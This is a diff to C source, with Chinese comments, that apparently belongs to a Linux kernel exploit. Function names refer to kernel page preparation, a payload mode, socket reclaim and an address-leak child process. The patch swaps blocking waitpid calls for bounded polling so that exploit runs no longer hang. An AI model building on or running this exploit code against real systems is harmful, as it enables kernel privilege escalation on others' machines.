@@ -489,7 +489,18 @@ void kill_child(pid_t child) {
     return;
   }
   SYSCHK(kill(child, SIGKILL));
-  SYSCHK(waitpid(child, NULL, 0));
+  /* mt80: 阻塞 waitpid 在 D 状态 SIGKILLed 子进程上会把整轮卡死
+   * (2026-09-06 E5 三连卡死根因, 见 CHECKPOINT_mt79)。改为有界轮询:
+   * WNOHANG 最多等 ~1s/child, 超时放弃收尸(僵尸在进程退出时由内核回收,
+   * 不占内存; D 状态子进程的内存本来也只在真正死亡时才释放)。
+   * 主流程永远不能被收尸阻塞。 */
+  for (int mt80_i = 0; mt80_i < 50; mt80_i++) {
+    if (waitpid(child, NULL, WNOHANG) != 0) {
+      return; /* 已回收(reaped) 或出错(已被收/无此进程) */
+    }
+    usleep(20000); /* 20ms */
+  }
+  /* 超时放弃: 留 zombie, 不阻塞主流程 */
 }
 
 void close_reclaim_sockets(void) {
@@ -861,7 +872,21 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       fflush(stdout);
       child_leak = clone_leak_child();
     }
-    SYSCHK(waitpid(child_leak, NULL, 0));
+    /* mt80: leak child 也可能有界收尸 — 它已完成 find_collisions 并退出,
+     * 卡在 D 只是退出残留; 有界等 3s, 超时按未收处理(state 检查兜底) */
+    {
+      int mt80_j;
+      for (mt80_j = 0; mt80_j < 150; mt80_j++) {
+        if (waitpid(child_leak, NULL, WNOHANG) != 0) {
+          break;
+        }
+        usleep(20000);
+      }
+      if (mt80_j >= 150) {
+        pr_warning("mt80: leak child reap timeout (D-state linger), continue\n");
+        fflush(stdout);
+      }
+    }
     pr_info("mt18-diag: leak child reaped (attempt %d)\n", attempt);
     fflush(stdout);
     collisions_ok = kernelsnitch_found_collisions(ks);
